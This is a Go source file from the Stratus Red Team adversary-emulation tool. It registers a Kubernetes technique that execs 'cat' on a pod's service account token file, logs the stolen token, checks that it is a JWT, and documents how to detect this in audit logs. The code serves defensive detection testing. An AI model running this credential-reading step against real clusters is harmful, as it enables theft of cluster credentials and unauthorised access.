package kubernetes

import (
	_ "embed"
	"errors"
	"log"
	"strings"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"github.com/golang-jwt/jwt/v4"
	v1 "k8s.io/api/core/v1"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/tools/remotecommand"
)

//go:embed main.tf
var tf []byte

//go:embed sample.pub
var randomPublicKey []byte

const file = "/var/run/secrets/kubernetes.io/serviceaccount/token"
const command = "cat " + file

var execOptions = v1.PodExecOptions{
	Command: strings.Split(command, " "),
	Stdout:  true,
}

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.credential-access.steal-serviceaccount-token",
		FriendlyName:       "Steal Pod Service Account Token",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.CredentialAccess},
		Description: `
Steals a service account token from a running pod, by executing a command in the pod and reading ` + file + `

Warm-up: 

- Create the Stratus Red Team namespace
- Create a Service Account
- Create a Pod running under this service account

Detonation: 

- Execute <code>` + command + `</code> into the pod to steal its service account token
`,
		Detection: `
Using Kubernetes API server audit logs, looking for execution events.

Sample event (shortened):

` + codeBlock + `json hl_lines="3 4 11 12 15"
{
	"objectRef": {
		"resource": "pods",
		"subresource": "exec",
		"name": "stratus-red-team-sample-pod",
	},
	"http": {
		"url_details": {
			"path": "/api/v1/namespaces/stratus-red-team-ubdaslyp/pods/stratus-red-team-sample-pod/exec",
			"queryString": {
				"command": "%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken",
				"stdout": "true"
			}
		},
		"method": "create"
	},
	"stage": "ResponseStarted",
	"kind": "Event",
	"level": "RequestResponse",
	"requestURI": "/api/v1/namespaces/stratus-red-team-ubdaslyp/pods/stratus-red-team-sample-pod/exec?command=cat&command=%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken&stdout=true",
}
` + codeBlock + `
`,
		PrerequisitesTerraformCode: tf,
		TerraformOverrideConfig:    []string{"image", "labels", "namespace", "node_selector", "tolerations"},
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	config := providers.K8s().GetRestConfig()
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podName := params["pod_name"]

	log.Println("Stealing service account token from pod " + podName + " in namespace " + namespace)
	log.Println("Running " + command)
	req := client.CoreV1().RESTClient().Post().Namespace(namespace).Resource("pods").Name(podName).SubResource("exec")
	req.VersionedParams(&execOptions, scheme.ParameterCodec)
	exec, err := remotecommand.NewSPDYExecutor(config, "POST", req.URL())
	if err != nil {
		return errors.New("unable to execute command in pod: " + err.Error())
	}

	stdout := new(strings.Builder)
	err = exec.Stream(remotecommand.StreamOptions{Stdout: stdout})
	if err != nil {
		return errors.New("unable to execute command in pod: " + err.Error())
	}

	log.Println("Successfully executed command inside pod to steal its service account token")
	serviceAccountToken := strings.TrimSpace(stdout.String())
	log.Println(serviceAccountToken)
	if !isValidServiceAccountToken(serviceAccountToken) {
		return errors.New("stolen service account token is not a valid JWT")
	}

	return nil
}

// Determines if a string is a correctly-formatted K8s service account token (JWT) with a "sub" claim
// Does not check the validity of a JWT
func isValidServiceAccountToken(candidate string) bool {
	token, err := jwt.Parse(candidate, func(token *jwt.Token) (interface{}, error) {
		// Note: We could use any key in here, we use a random one from https://github.com/dgrijalva/jwt-go/blob/master/test/sample_key.pub
		// We don't want to verify the validity of the JWT, just ensure it's a well-formatted one
		return jwt.ParseRSAPublicKeyFromPEM(randomPublicKey)
	})

	if err != nil {
		// Parsing or verification failed
		if validationError, ok := err.(*jwt.ValidationError); ok {
			// Return true if the error is anything else than a "JWT malformed" error
			// Here the error can be "invalid signature", which is expected
			return validationError.Errors&jwt.ValidationErrorMalformed == 0
		} else {
			return false
		}
	}

	// Ensure the JWT has the 'sub' claim we expect in a K8s JWT
	claims, ok := token.Claims.(jwt.MapClaims)
	if !ok {
		return false
	}

	subjectClaim, ok := claims["sub"]
	if !ok {
		return false
	}

	_, ok = subjectClaim.(string)
	return ok
}
